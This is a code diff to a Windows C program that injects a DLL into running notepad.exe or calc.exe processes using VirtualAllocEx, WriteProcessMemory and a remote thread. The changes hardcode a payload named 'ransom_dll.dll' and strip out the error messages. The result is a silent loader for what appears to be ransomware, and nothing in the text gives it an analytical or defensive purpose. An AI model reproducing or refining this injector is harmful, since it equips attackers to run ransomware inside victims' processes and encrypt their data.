@@ -2,6 +2,10 @@
 #include <tlhelp32.h>
 #include <stdio.h>
 
+#include "get_dir.h"
+
+#define MAX_PATH 260
+
 DWORD get_pid_from_list(const char *names[], size_t count)
 {
     PROCESSENTRY32 pe;
@@ -26,29 +30,24 @@ DWORD get_pid_from_list(const char *names[], size_t count)
     return 0; // No process found
 }
 
-int main(int argc, char **argv)
-{
+int main(void) {
+
     // List of process names to target
     const char *processes[] = {
         "notepad.exe",
         "calc.exe",
-        "explorer.exe"
     };
 
-    if (argc != 2)
-    {
-        printf("Use: %s <dll path>\n", argv[0]);
-        return 1;
-    }
-
     // Get dll path and pid
-    const char *path = argv[1];
-    DWORD pid = get_pid_from_allowed_list(processes, sizeof(processes) / sizeof(processes[0]));
+    char exe_dir[MAX_PATH];
+    get_dir(exe_dir, sizeof(exe_dir));
 
-    if (pid)
-        return pid;
-    else
-        printf("No allowed process running.\n");
+    char dll[MAX_PATH];
+    snprintf(dll, sizeof(dll), "%s\\%s", exe_dir, "ransom_dll.dll");
+
+    DWORD pid = get_pid_from_list(processes, sizeof(processes) / sizeof(processes[0]));
+
+    if (!pid)
         return 0;
 
     // Get process handle
@@ -56,28 +55,25 @@ int main(int argc, char **argv)
 
     if (h_process == NULL)
     {
-        printf("\nFailed to get the process handle - %d\n", GetLastError());
         return 1;
     }
 
     // Allocate memory
-    LPVOID mem_alloc = VirtualAllocEx(h_process, NULL, strlen(path) + 1, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
+    LPVOID mem_alloc = VirtualAllocEx(h_process, NULL, strlen(dll) + 1, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
 
     if (mem_alloc == NULL)
     {
-        printf("Failed to allocate memory in process - %d\n", GetLastError());
         return 1;
     }
 
     // Write dll into memory
-    WriteProcessMemory(h_process, mem_alloc, path, strlen(path) + 1, NULL);
+    WriteProcessMemory(h_process, mem_alloc, dll, strlen(dll) + 1, NULL);
 
     // Get handle to kernel32.dll
-    HMODULE h_kernel32 = GetModuleHandleW(L"kernel32.dll");
+    HMODULE h_kernel32 = GetModuleHandleA("kernel32.dll");
 
     if (h_kernel32 == NULL)
     {
-        printf("Failed to get the kernel32 handle - %d\n", GetLastError());
         return 1;
     }
 
@@ -87,7 +83,6 @@ int main(int argc, char **argv)
 
     if (h_thread == NULL)
     {
-        printf("Failed to create thread in process - %d\n", GetLastError());
         return 1;
     }
 
